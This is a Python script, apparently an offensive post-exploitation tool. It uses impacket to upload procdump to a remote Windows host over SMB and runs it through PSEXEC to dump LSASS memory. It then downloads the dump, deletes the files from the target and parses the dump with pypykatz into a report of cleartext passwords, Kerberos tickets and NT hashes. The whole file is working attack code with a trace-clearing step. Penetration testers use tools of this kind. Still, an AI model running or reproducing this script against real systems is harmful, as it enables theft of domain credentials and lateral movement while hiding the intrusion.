#!/usr/bin/python3
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP
from configuration import src_x32, src_x64
from argparse import Namespace
from psexec import PSEXEC
from os import path
import re
import json
import os


#########################Pypykatz##############################
# sys.path.append("pypykatz/pypykatz")

from pypykatz.utils.crypto.cmdhelper import CryptoCMDHelper
from pypykatz.ldap.cmdhelper import LDAPCMDHelper
from pypykatz.kerberos.cmdhelper import KerberosCMDHelper
from pypykatz.lsadecryptor.cmdhelper import LSACMDHelper
from pypykatz.registry.cmdhelper import RegistryCMDHelper
from pypykatz.remote.cmdhelper import RemoteCMDHelper

###############################################################


class Dumper:
    def __init__(self, username, password, domain, target):
        self.target = target
        if domain is None:
            domain = ""
        self.credentials = {
            "username": username,
            "password": password,
            "domain": domain,
        }
        self.smb_impacket = SMBConnection(
            self.target, self.target, sess_port=445, timeout=4
        )
        self.host_info = self.enum_host_info()

        self.run()

    def enum_host_info(self):
        info_dict = {}
        self.smb_impacket.login(
            user=self.credentials["username"],
            password=self.credentials["password"],
            domain=self.credentials["domain"],
        )
        os = self.smb_impacket.getServerOS()
        arch = self.get_arch()
        domain = self.smb_impacket.getServerDomain()
        info_dict.update({"target": self.target})
        info_dict.update({"os": os})
        info_dict.update({"domain": domain})
        info_dict.update({"arch": arch})

        return info_dict

    def get_arch(self):
        try:
            NDR64Syntax = ("71710533-BEBA-4937-8319-B5DBEF9CCC36", "1.0")
            stringBinding = r"ncacn_ip_tcp:%s[135]" % self.target
            transport = DCERPCTransportFactory(stringBinding)
            transport.set_connect_timeout(int(10))
            dce = transport.get_dce_rpc()
            dce.connect()
            try:
                dce.bind(MSRPC_UUID_PORTMAP, transfer_syntax=NDR64Syntax)
            except DCERPCException as e:
                if str(e).find("syntaxes_not_supported") >= 0:
                    return 32
                else:
                    pass
            else:
                return 64
            dce.disconnect()
        except Exception:
            return None

    def upload_file(self):
        if self.host_info["arch"] == 64:
            src = src_x64
        elif self.host_info["arch"] == 32:
            src = src_x32
        filename = re.sub(r"\d+", "", path.basename(src))
        self.smb_impacket.putFile("C$", filename, open(src, "rb").read)

    def upload_file_smbmap(self):
        if self.host_info["arch"] == 64:
            src = src_x64
        elif self.host_info["arch"] == 32:
            src = src_x32
        dst = "C$\procdump.exe"
        self.smb_smbmap.upload_file(self.host_info["target"], src, dst)

    def exec_procdump(self):

        executer = PSEXEC(
            " ".join(["C:\\procdump.exe -ma lsass.exe C:\\lsass_dump"]),
            None,
            None,
            None,
            int(445),
            self.credentials["username"],
            self.credentials["password"],
            self.credentials["domain"],
            None,
            None,
            False,
            None,
            "",
        )
        executer.run(
            remoteName=self.host_info["target"], remoteHost=self.host_info["target"]
        )

    def dump_lsass(self):
        print("Dumping")
        self.smb_impacket.getFile(
            "C$", "/lsass_dump.dmp", open("lsass_dump.dmp", "wb").write
        )
        print("Finished")

    def clear_out(self):
        print("Starting ClearOut")
        self.smb_impacket.deleteFile("C$", "/lsass_dump.dmp")
        self.smb_impacket.deleteFile("C$", "/procdump.exe")
        self.smb_impacket.close()
        print("ClearOut Finished")

    @staticmethod
    def dump_to_pypykatz(dump_file="./lsass_dump.dmp"):
        print("Pypykatz doing his job...")

        cmdhelpers = [
            LSACMDHelper(),
            RegistryCMDHelper(),
            CryptoCMDHelper(),
            LDAPCMDHelper(),
            KerberosCMDHelper(),
            RemoteCMDHelper(),
        ]
        args = Namespace()
        args.cmd = "minidump"

        args.command = "lsa"
        args.directory = False
        args.halt_on_error = False
        args.json = True
        args.kerberos_dir = False
        args.memoryfile = dump_file
        args.outfile = "temp_report.json"
        args.recursive = False
        args.timestamp_override = None
        args.verbose = 0

        for helper in cmdhelpers:
            helper.execute(args)
        print("Removing dump file")
        os.remove(dump_file)
        print("Finished")

    @staticmethod
    def create_report(filename):
        print("Creating report")
        with open("./temp_report.json", "r") as jf:
            parsed = json.load(jf)["./lsass_dump.dmp"]
            with open(filename, "w") as report:
                for el in parsed["logon_sessions"]:
                    temp = parsed["logon_sessions"][el]
                    if len(temp["kerberos_creds"]) > 0:
                        for cr in temp["kerberos_creds"]:
                            if cr["username"] is not None:
                                if cr["password"] is not None:
                                    report.write(
                                        f"From Kerberos (Domain/username:password) -- {cr['domainname']}/{cr['username']}:{cr['password']}\n"
                                    )
                                elif len(cr["tickets"]) > 0:
                                    report.write(
                                        f"From Kerberos (Domain/username:tickets) -- {cr['domainname']}/{cr['username']}:{cr['tickets']}\n"
                                    )
                    if len(temp["livessp_creds"]) > 0:
                        report.write("Did not expect creds to be in livessp\n")
                    if len(temp["ssp_creds"]) > 0:
                        for cr in temp["ssp_creds"]:
                            if cr["username"] is not None:
                                if cr["password"] is not None:
                                    report.write(
                                        f"From SSP (Domain/username:password) -- {cr['domainname']}/{cr['username']}:{cr['password']}\n"
                                    )
                    if len(temp["tspkg_creds"]) > 0:
                        report.write(
                            "Have no idea, what is tspkg and how to parse it\n"
                        )
                    if len(temp["wdigest_creds"]) > 0:
                        for cr in temp["wdigest_creds"]:
                            if cr["username"] is not None:
                                if cr["password"] is not None:
                                    report.write(
                                        f"From Wdigest (Domain/username:password) -- {cr['domainname']} / {cr['username']}:{cr['password']}\n"
                                    )
                    if len(temp["msv_creds"]) > 0:
                        for cr in temp["msv_creds"]:
                            if cr["username"] is not None:
                                if cr["NThash"] is not None:
                                    report.write(
                                        f"From MSV (Domain/username:NThash) -- {cr['domainname']} / {cr['username']}:{cr['NThash']}\n"
                                    )

                for el in parsed["orphaned_creds"]:
                    # temp = parsed["orphaned_creds"][el]
                    if "username" in el.keys() and el["username"] is not "":
                        if el["password"] is not None:
                            report.write(
                                f"From orphaned creds (Domain/username:password) -- {el['domainname']}/{el['username']}:{el['password']}\n"
                            )
                        elif "tickets" in el.keys() and len(el["tickets"]) > 0:
                            report.write(
                                f"From orphaned creds (Domain/username:tickets) -- {el['domainname']}/{el['username']}:{el['tickets']}\n"
                            )
        os.remove("./temp_report.json")
        print("Finished :)")

    def run(self):
        self.upload_file()
        self.exec_procdump()
        self.dump_lsass()
        self.clear_out()
        Dumper.dump_to_pypykatz("./lsass_dump.dmp")
        Dumper.create_report(f'./reports/{self.host_info["target"]}_report.txt')
